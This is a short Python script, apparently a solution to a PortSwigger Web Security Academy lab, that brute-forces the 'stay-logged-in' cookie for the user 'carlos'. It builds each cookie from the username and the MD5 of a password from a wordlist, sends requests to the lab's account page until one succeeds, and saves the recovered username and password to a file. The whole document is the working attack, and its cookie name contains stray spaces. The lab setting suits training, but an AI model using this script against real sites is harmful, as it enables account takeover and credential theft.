import requests
import hashlib
import base64

URL = 'https://ac931f011e75c5f3c056329a00bb00ac.web-security-academy.net/my-account'

status_code = requests.get(url=URL).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

username = 'carlos'
password = None

for pwd in open('../password-based/password.txt', 'r').readlines():
    pwd = pwd[:-1]
    cookie = username + ':' + hashlib.md5(pwd.rstrip().encode()).hexdigest()
    print(cookie)
    cookie = {
        'stay - logged - in': base64.b64encode(cookie.encode()).decode()
    }
    res = requests.get(url=URL, cookies=cookie, allow_redirects=False)
    with open(f'res_{pwd}.html', 'w') as file:
        file.write(res.text)

    if res.status_code == 200:
        password = pwd
        break

print(f"{username}:{password}")
with open("credential.txt", 'w') as file:
    file.write(f"{username}:{password}")
